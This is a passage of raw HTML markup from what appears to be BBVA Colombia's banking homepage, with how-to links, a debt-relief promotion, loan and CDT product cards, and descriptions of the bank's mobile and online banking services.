    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon1" data-dl-component-type="bbva/pwebs/components/par/unremovable/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " target="_self" title="Conoce nuestros canales digitales" aria-label="Conoce nuestros canales digitales" href="/personas/servicios-digitales.html?=home">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_027_desktop.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Conoce nuestros canales digitales</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon2" data-dl-component-type="bbva/pwebs/components/par/unremovable/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.bbva.com.co/personas/productos/cuentas/herramientas/formulario-solicitud/" target="_self" title="¿Cómo abrir una cuenta en línea?" aria-label="¿Cómo abrir una cuenta en línea?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_004_account.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo abrir una cuenta en línea?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithiconnotarget_1279134180" data-dl-component-type="bbva/pwebs/components/par/productslider/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.bbva.com.co/personas/blog/tutoriales/bbva-net/pagos-pse.html?=home" target="_self" title="Como realizar pagos por PSE" aria-label="Como realizar pagos por PSE">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_035_bill.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo realizar pagos por PSE?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon3" data-dl-component-type="bbva/pwebs/components/par/unremovable/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.youtube.com/embed/kqRA5JMj32I?rel=0&showinfo=0&autoplay=1" target="_lightbox" data-lightbox-ismodal="false" title="¿Cómo descargar extractos?" aria-label="¿Cómo descargar extractos?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_016_safeforlater.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo descargar extractos?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon4" data-dl-component-type="bbva/pwebs/components/par/unremovable/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.youtube.com/embed/mRUFgzNMPPI?rel=0&showinfo=0&autoplay=1" target="_lightbox" data-lightbox-ismodal="false" title="¿Cómo hacer transferencias?" aria-label="¿Cómo hacer transferencias?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_033_transfer.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo hacer transferencias?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithiconnotarget_871552999" data-dl-component-type="bbva/pwebs/components/par/productslider/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.youtube.com/embed/PIZjI-0BWMY?rel=0&showinfo=0&autoplay=1" target="_lightbox" data-lightbox-ismodal="false" title="¿Cómo recibir dinero del exterior?" aria-label="¿Cómo recibir dinero del exterior?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/2_029_correctlocation.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo recibir dinero del exterior?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon5" data-dl-component-type="bbva/pwebs/components/par/unremovable/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.youtube.com/embed/Qh2HQezaRhM?rel=0&showinfo=0&autoplay=1" target="_lightbox" data-lightbox-ismodal="false" title="¿Cómo enviar dinero al exterior?" aria-label="¿Cómo enviar dinero al exterior?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_028_international.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo enviar dinero al exterior?</span>
        </span>
    </a>
</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon6" data-dl-component-type="bbva/pwebs/components/par/unremovable/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.youtube.com/embed/wmJuNazfgrQ?rel=0&showinfo=0&autoplay=1" target="_lightbox" data-lightbox-ismodal="false" title="¿Cómo activar mi tarjeta de crédito?" aria-label="¿Cómo activar mi tarjeta de crédito?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_014_digitalcard.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo activar mi tarjeta de crédito?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithiconnotarget" data-dl-component-type="bbva/pwebs/components/par/productslider/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.youtube.com/embed/8IwsdZ3w5p4?rel=0&showinfo=0&autoplay=1" target="_lightbox" data-lightbox-ismodal="false" title="¿Cómo asignar la clave de mi tarjeta BBVA?" aria-label="¿Cómo asignar la clave de mi tarjeta BBVA?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/pin.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo asignar la clave de mi tarjeta BBVA?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithiconnotarget_1203319220" data-dl-component-type="bbva/pwebs/components/par/productslider/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.bbva.com.co/personas/informacion-practica/pago-de-impuestos.html?=home" target="_self" title="¿Cómo pagar impuestos?" aria-label="¿Cómo pagar impuestos?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/5_079_taxes.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo pagar impuestos?</span>
        </span>
    </a>

</li>


    
    
    <li class="linkwithicon">

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithiconnotarget_1888146794" data-dl-component-type="bbva/pwebs/components/par/productslider/linkwithiconnotarget" class="linkwithicon__link link__base link__base--linked  " href="https://www.bbva.com.co/personas/tus-pagos/tienda.html?=home" target="_self" title="¿Cómo hacer pagos?" aria-label="¿Cómo hacer pagos?">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_002_dollar.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">¿Cómo hacer pagos?</span>
        </span>
    </a>

</li>



                    </ul>
                    <div class="swiper-pagination"></div>
                </div>
                <div class="productslider__overlay productslider__overlay--left"></div>
                <div class="productslider__overlay productslider__overlay--right"></div>
            </div>
        </div>
    </section>
</div>
<div class="promoalert alert aem-GridColumn aem-GridColumn--default--12">











    
    
    



    
    




    <div itemscope itemtype="http://schema.org/CommunicateAction" data-component="alert" data-component-params='{&quot;selectors&quot;:{&quot;close&quot; : &quot;.promoalert__close&quot;}}'>
        
         
         
         
         
        <div class="promoalert__container
                    promoalert__container--full
                     " data-dl-component data-dl-component-name="promoalert_copy_copy" data-dl-component-type="bbva/pwebs/components/par/promoalert" id="content-promoalert_copy_copy">
            <div class="promoalert__base promoalert--banner-light promoalert--banner
                        promoalert--withimg
                        
                        ">
                <div class="promoalert__content container">
                     
                        <div class="promoalert__image   ">
                            <div class="promoalert__mask">
                                <svg viewBox="0 0 58 257" aria-hidden="true" focusable="false" version="1.1" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
                                    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                        <polygon fill="#000000" fill-rule="nonzero" points="0.3515625 256.273438 28.625 256.273438 57.4921875 0.12109375 0.3515625 0.12109375"></polygon>
                                    </g>
                                </svg>
                            </div>
                            
                            
                                
                                    
    
        


    
    
    
    
    
     <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/handshake.svg" srcset="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/handshake.svg" sizes="(min-width: 600px) 50vw, 100vw" itemprop="image" class="promoalert__img " alt="borron y cuanta nueva"/>

    

                                
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                        </div>
                    

                    <div class="promoalert__main">
                        
                        <div class="promoalert__texts">
                            <h5 itemprop="name" class="promoalert__title">Tienes una gran oportunidad en tus manos</h5>
                            <div itemprop="description" class="promoalert__text rte">Si eres cliente de BBVA y tienes operaciones en mora o castigada, y deseas acogerte a los beneficios de <b>borrón y cuenta nueva</b>, regístrate para brindarte más información acerca de las alternativas que tenemos para ti.</div>
                            <div class="promoalert__footer">
                                
                                
                                <a itemprop="mainEntityOfPage" class="promoalert__link link__base   " href="https://www.bbva.com.co/personas/landing/borron-y-cuenta-nueva.html" aria-label="Conoce más" title="Conoce más" target="_self">
                                    Conoce más
                                </a>
                            </div>
                        </div>
                        
                    </div>

                    
                </div>
            </div>
        </div>
    </div>
</div>
<div class="outstandingopportunitymodule aem-GridColumn aem-GridColumn--default--12">




    <div class="outstandingopportunitymodule__base background--white ">
        
        
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.outstandingopportunity/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.outstandingopportunity/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

        
    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.outstandingopportunity/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>


        <div class="container outstandingopportunitymodule__header">
            <span id="content-outstandingopportuni" class="anchor-navigation-reference"></span>
            
            
        </div>

        <div data-component="outstandingopportunitycard">




    
    
    <div class="outstandingopportunity">




    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.outstandingopportunitycard/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">



<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.outstandingopportunitycard/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.outstandingopportunitycard/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.featuredoutstandingopportunitycard/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">



<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.featuredoutstandingopportunitycard/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.featuredoutstandingopportunitycard/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>





<section>
	<article>
		<div class="outstandingopportunity__base" itemscope itemtype="http://schema.org/FinancialProduct">
			<span id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity" class="anchor-navigation-reference"></span>
			<div class="container">
				
					<div class="outstandingopportunity__cards">
						
							<div class="outstandingopportunity__featured outstandingopportunity__featured--left">





<div class="featuredoutstandingopportunitycard__base" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-featuredoutstandingopportunitycard">
  <div class="featuredoutstandingopportunitycard__image ">

      
      
      
    
    
    
    
        <a itemprop="url" data-dl-component-name="featuredoutstandingopportunitycard" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/featuredoutstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-featuredoutstandingopportunitycard" class="featuredoutstandingopportunitycard__imagelink  " aria-label="Ver más" target="_self" title="Ver más"  href="/personas/sostenibilidad.html">
            
            
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Sostenibilidad-BBVA-colombia-home.jpg.img.1176.1645648239336.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Sostenibilidad-BBVA-colombia-home.jpg.img.320.1645648239336.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Sostenibilidad-BBVA-colombia-home.jpg.img.768.1645648239336.jpg 768w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Sostenibilidad-BBVA-colombia-home.jpg.img.960.1645648239336.jpg 960w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Sostenibilidad-BBVA-colombia-home.jpg.img.1176.1645648239336.jpg 1176w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 40vw, 90vw" itemprop="image" class="featuredoutstandingopportunitycard__img " alt="Un futuro más verde"/>

    

                <span></span>
                <div class="image__overlay"></div>
            
        </a>
    

    
  </div>
  <div class="featuredoutstandingopportunitycard__content">
    <h4 itemprop="name" class="featuredoutstandingopportunitycard__title">
        <img class="bbva-svgicon" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/generic-sustainability.svg" alt=""/>
        
            
            
    
    
    
    
        <a itemprop="url" data-dl-component-name="featuredoutstandingopportunitycard" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/featuredoutstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-featuredoutstandingopportunitycard" class="featuredoutstandingopportunitycard__imagelink  " aria-label="Ver más" target="_self" title="Ver más"  href="/personas/sostenibilidad.html">
            
            <span itemprop="name" class="featuredoutstandingopportunitycard__titlelink">Cuando tu banco cuida tus recursos y los del medio ambiente, todo hace clic </span>
            
        </a>
    

        
    </h4>
    <span class="featuredoutstandingopportunitycard__subtitle">Conoce nuestras soluciones sostenibles para ti.</span>
     
         
         
    
    
    
    
        <a itemprop="url" data-dl-component-name="featuredoutstandingopportunitycard" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/featuredoutstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-featuredoutstandingopportunitycard" class="featuredoutstandingopportunitycard__link link__base  " aria-label="Ver más" target="_self" title="Ver más"  href="/personas/sostenibilidad.html">
            
            <span itemprop="name">Ver más</span>
            
        </a>
    

     
  </div>
</div></div>
							<div class="outstandingopportunity__left">
								<div class="outstandingopportunity__line">
									
										
	<div class="outstandingopportunity__card">



<div class="outstandingopportunitycard__base pseudo--white" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsTopLeft">
     <div class="outstandingopportunitycard__container">
        
        <img class="bbva-svgicon bbva-svgicon--large" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_002_home.svg" alt=""/>
        <h3 itemprop="name" class="outstandingopportunitycard__title ">Créditos de vivienda</h3>
        <span itemprop="description" class="outstandingopportunitycard__subtitle ">Cuando dejas de pagar arriendo para empezar a pagar tu casa gracias al Crédito de Vivienda BBVA, todo hace clic.</span>
        
        
            
            
    
    
    
    
        <a itemprop="url" data-dl-component="truncate" data-dl-component-name="outsTopLeft" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/outstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsTopLeft" href="https://www.bbva.com.co/personas/productos/prestamos/vivienda.html" class="link__base outstandingopportunitycard__link  " aria-label="Conoce más" target="_self" title="Conoce más" >
            <i></i>
            <span itemprop="name">Conoce más</span>
            
        </a>
    

        
    </div>
    <span class="alignVertical"></span>
</div></div>

										
	<div class="outstandingopportunity__card">



<div class="outstandingopportunitycard__base pseudo--white" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsTopRight">
     <div class="outstandingopportunitycard__container">
        
        <img class="bbva-svgicon bbva-svgicon--large" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/5_055_mooncar.svg" alt=""/>
        <h3 itemprop="name" class="outstandingopportunitycard__title ">Creditos de Vehículo</h3>
        <span itemprop="description" class="outstandingopportunitycard__subtitle ">Obtén condiciones y beneficios especiales para adquirir tu carro nuevo, usado y/o productivo</span>
        
        
            
            
    
    
    
    
        <a itemprop="url" data-dl-component="truncate" data-dl-component-name="outsTopRight" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/outstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsTopRight" href="https://www.bbva.com.co/personas/productos/prestamos/vehiculo.html" class="link__base outstandingopportunitycard__link  " aria-label="Conoce más" target="_self" title="Conoce más" >
            <i></i>
            <span itemprop="name">Conoce más</span>
            
        </a>
    

        
    </div>
    <span class="alignVertical"></span>
</div></div>

									
									
								</div>
								<div class="outstandingopportunity__line">
									
										
	<div class="outstandingopportunity__card">



<div class="outstandingopportunitycard__base pseudo--white" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsBottomLeft">
     <div class="outstandingopportunitycard__container">
        
        <img class="bbva-svgicon bbva-svgicon--large" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_062_ric.svg" alt=""/>
        <h3 itemprop="name" class="outstandingopportunitycard__title ">CDT Online</h3>
        <span itemprop="description" class="outstandingopportunitycard__subtitle ">Empieza a ahorrar desde tu celular abriendo un CDT Online desde BBVA móvil.</span>
        
        
            
            
    
    
    
    
        <a itemprop="url" data-dl-component="truncate" data-dl-component-name="outsBottomLeft" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/outstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsBottomLeft" class="link__base outstandingopportunitycard__link  " aria-label="Conoce más" target="_self" title="Conoce más"  href="/personas/servicios-digitales/cdt-online.html">
            <i></i>
            <span itemprop="name">Conoce más</span>
            
        </a>
    

        
    </div>
    <span class="alignVertical"></span>
</div></div>

										
	<div class="outstandingopportunity__card">



<div class="outstandingopportunitycard__base pseudo--white" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsBottomRight">
     <div class="outstandingopportunitycard__container">
        
        <img class="bbva-svgicon bbva-svgicon--large" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_009_transfercard.svg" alt=""/>
        <h3 itemprop="name" class="outstandingopportunitycard__title ">Tarjeta Amparada</h3>
        <span itemprop="description" class="outstandingopportunitycard__subtitle ">Comparte parte del cupo de tu tarjeta de crédito otorgándole una tarjeta amparada a los familiares que necesites.</span>
        
        
            
            
    
    
    
    
        <a itemprop="url" data-dl-component="truncate" data-dl-component-name="outsBottomRight" data-dl-component-type="bbva/pwebs/components/par/outstandingopportunitymodule/outstandingopportunity/outstandingopportunitycard" id="content-outstandingopportuni-outstandingopportunitymoduleparsys-outstandingopportunity-outsBottomRight" class="link__base outstandingopportunitycard__link  " aria-label="Conoce más" target="_self" title="Conoce más"  href="/personas/productos/tarjetas-de-credito/amparada.html">
            <i></i>
            <span itemprop="name">Conoce más</span>
            
        </a>
    

        
    </div>
    <span class="alignVertical"></span>
</div></div>

									
									
								</div>
							</div>
						
					</div>
				
			</div>
		</div>
	</article>
</section>






</div>


</div>
    </div>
</div>
<div class="godigital aem-GridColumn aem-GridColumn--default--12">




    
    <!-- no encontrado -->
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.godigital/small.lc-20220713-060320-lc.min.css" media="print" onload="this.media='all'">

    <!-- no encontrado (Fin) -->

    
    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.godigital/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>


    <div class="godigital__base  background--core-blue" data-dl-component data-dl-component-name="godigital_copy" data-dl-component-type="bbva/pwebs/components/par/godigital" id="content-godigital_copy">
        <article class="container">
            <div class="godigital__grid">
                <h2 itemprop="name" class="godigital__title">Digitalízate</h2>
                <h3 class="godigital__subtitle">
                     <a itemprop="url" class="link__base link__base--core  " target="_self" aria-label="Ahorra tiempo y esfuerzo con nuestros servicios digitales" title="Ahorra tiempo y esfuerzo con nuestros servicios digitales" href="/personas/servicios-digitales.html">
                        Ahorra tiempo y esfuerzo con nuestros servicios digitales
                    </a>
                </h3>
                <ul class="godigital__items">
                    <li class="godigital__item">



<a class="godigital__card godigital__card--animated animations__godigital background--core-blue-dark
         " itemprop="url" target="_self" title="BBVA móvil" aria-label="Conoce más sobre BBVA móvil" href="/personas/servicios-digitales/movil.html">
    
    <div class=" godigital__card__content godigital__card--background">
        <div class="godigital__overlay"></div>
        <div class="godigital__card__text__container">
            <div class="godigital__card__text">
                <div class="godigital__card__text--center">
                    <div class="godigital__card__text__content">
                        
                        <h4 itemprop="name" class="godigital__card__text__title">BBVA móvil</h4>
                        <h5 class="godigital__card__text__subtitle">Lleva el banco en tu celular:</h5>
                        
                        <div class="godigital__card__text__rte__container">
                            <div class="godigital__card__text__rte rte">
                                <ul>
<li>Hazte cliente</li>
<li>Paga productos y servicios</li>
<li>Transfiere</li>
<li>consulta saldos y movimientos</li>
<li>retira sin tarjeta</li>
</ul>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="godigital__image">
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-movil-app-.jpg.img.1176.1623361766617.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-movil-app-.jpg.img.320.1623361766617.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-movil-app-.jpg.img.768.1623361766617.jpg 768w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-movil-app-.jpg.img.960.1623361766617.jpg 960w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-movil-app-.jpg.img.1176.1623361766617.jpg 1176w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 40vw, 90vw" itemprop="image" class="godigital__image__img " alt="bbva movil"/>

    

            
        </div>
    </div>
</a>
</li><li class="godigital__item">



<a class="godigital__card godigital__card--animated animations__godigital background--core-blue-dark
         " itemprop="url" href="https://www.bbva.com.co/personas/servicios-digitales/net.html" target="_self" title="BBVA net" aria-label="enlace a BBVA net">
    
    <div class=" godigital__card__content godigital__card--background">
        <div class="godigital__overlay"></div>
        <div class="godigital__card__text__container">
            <div class="godigital__card__text">
                <div class="godigital__card__text--center">
                    <div class="godigital__card__text__content">
                        
                        <h4 itemprop="name" class="godigital__card__text__title">BBVA net</h4>
                        <h5 class="godigital__card__text__subtitle">Realiza desde casa todas las operaciones que necesitas</h5>
                        
                        <div class="godigital__card__text__rte__container">
                            <div class="godigital__card__text__rte rte">
                                <p>Al abri:</p>
<ul>
<li>Paga productos y servicios.</li>
<li>Transfiere sin costo.</li>
<li>Personaliza tus canales.</li>
</ul>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="godigital__image">
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cdt-en-linea.jpg.img.768.1630528234528.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cdt-en-linea.jpg.img.320.1630528234528.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cdt-en-linea.jpg.img.768.1630528234528.jpg 768w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 40vw, 90vw" itemprop="image" class="godigital__image__img " alt="BBVA net"/>

    

            
        </div>
    </div>
</a>
</li><li class="godigital__item">
<a class="godigital__card godigital__card--animated animations__godigital background--core-blue-dark
         " itemprop="url" href="https://www.bbva.com.co/personas/servicios-digitales/cajeros.html" target="_self" title="Cajeros automáticos" aria-label="Cajero automático">
    
    <div class=" godigital__card__content godigital__card--background">
        <div class="godigital__overlay"></div>
        <div class="godigital__card__text__container">
            <div class="godigital__card__text">
                <div class="godigital__card__text--center">
                    <div class="godigital__card__text__content">
                        
                        <h4 itemprop="name" class="godigital__card__text__title">Cajeros automáticos</h4>
                        <h5 class="godigital__card__text__subtitle">Retira dinero en efectivo de manera segura</h5>
                        
                        <div class="godigital__card__text__rte__container">
                            <div class="godigital__card__text__rte rte">
                                Ubica tu cajero automático más cercano en BBVA móvil, retira dinero y haz otras transacciones.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="godigital__image">
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cajeros-bbva-card.jpg.img.768.1630528179775.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cajeros-bbva-card.jpg.img.320.1630528179775.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cajeros-bbva-card.jpg.img.768.1630528179775.jpg 768w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 40vw, 90vw" itemprop="image" class="godigital__image__img " alt="Salud financiera"/>

    

            
        </div>
    </div>
</a>
</li><li class="godigital__item">



<a class="godigital__card godigital__card--animated animations__godigital background--medium-blue
         " itemprop="url" target="_self" title="Cuenta en Línea" aria-label="cuenta en linea" href="/personas/servicios-digitales/cuenta-en-linea.html">
    
    <div class=" godigital__card__content godigital__card--background">
        <div class="godigital__overlay"></div>
        <div class="godigital__card__text__container">
            <div class="godigital__card__text">
                <div class="godigital__card__text--center">
                    <div class="godigital__card__text__content">
                        
                        <h4 itemprop="name" class="godigital__card__text__title">Cuenta en Línea</h4>
                        <h5 class="godigital__card__text__subtitle">Abre una cuenta de ahorros desde BBVA móvil</h5>
                        
                        <div class="godigital__card__text__rte__container">
                            <div class="godigital__card__text__rte rte">
                                <ul>
<li>Solo necesitas cinco minutos</li>
<li>Únicamente con tu cédula</li>
<li>Abre tu cuenta de nómina o de ahorro</li>
<li>Transferencias gratis</li>
</ul>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="godigital__image">
            
                
    
        


    
    
    
    
    
